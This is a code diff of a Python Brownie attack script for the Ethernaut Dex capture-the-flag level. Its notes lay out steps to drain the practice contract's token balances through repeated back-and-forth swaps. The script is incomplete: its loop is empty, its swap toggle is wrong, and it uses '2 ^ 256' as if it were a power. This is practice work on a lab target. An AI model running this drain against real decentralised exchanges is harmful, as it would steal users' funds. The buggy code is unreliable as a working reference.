@@ -11,24 +11,59 @@ AMOUNT = 10
 GAS_LIMIT = 6000000
 
 
-def balances():
-    target = interface.IDex(ETHERNAUT_INSTANCE)
-    balance1 = target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
-    balance2 = target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
+def balances(_target):
+    balance1 = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
+    balance2 = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
     print(f"\nbalance 1 = {balance1}, balance 2 = {balance2}\n")
 
 
 def main():
-
+    # steps 1 and 2
     player = get_account()
-    attack = Attack22.deploy(ETHERNAUT_INSTANCE, {"from": player})
-    balances()
-    # attack.attack({"from": player})
-    # balances()
-
+    target = interface.IDex(ETHERNAUT_INSTANCE)
+    balances(target)
+    # step 3
+    token1 = interface.IERC20(target.token1())
+    token2 = interface.IERC20(target.token2())
+    # step 4
+    token1.approve(target, 2 ^ 256, {"from": player})
+    token2.approve(target, 2 ^ 256, {"from": player})
+    # step 5a
+    tokenTo = token1
+    tokenFrom = token2
+    # step 5b
+    tokenTo = tokenFrom
+    tokenFrom = tokenTo
+    # step 6
+    price = target.getSwapPrice(tokenFrom, tokenTo, tokenFrom.balanceOf(player))
+    # step 7
+    while price <= tokenTo.balanceOf(target):
+        
 
 """
-        Audit notes:
+        Script steps:
+        
+        1) set player account
+        2) define target interface (Dex contract)
+        3) define token1 and token2
+        4) approve token1 and token2
+        
+        5) assign tokenTo and tokenFrom (so you can toggle them)
+            5a. assign tokenTo / tokenFrom
+            5b. toggle to/from
+        
+        6) get swap_price
+
+        7) while swap_price < tokenTo.balanceOf(target)
+            8a. perform swap
+            8b. toggle to/from
+            8c. get swap_price
+
+        8) manually perform the final swap to drain the funds
+                        
+    ===================================================================
+
+    Audit notes:
 
         1. Dex contract
             - storage slot 0, 1, 2 -> contain addresses
@@ -45,23 +80,6 @@ def main():
         5. Swap process ->
 
             - see 22-simulate_dex.py (this models the swap process)
-                       
-    ===================================================================
-
-        Script steps:
         
-        1) set player account
-        2) define target interface (Dex contract)
-        3) define token1 and token2
-        4) approve token1 and token2
-        5) assign tokenTo and tokenFrom (so you can toggle them)
-        7) get swap_price
-
-        8) while swap_price < tokenTo.balanceOf(target)
-            8a. perform swap
-            8b. toggle to/from
-            8c. get swap_price
-
-        9) manually perform the final swap to drain the funds
 
 """
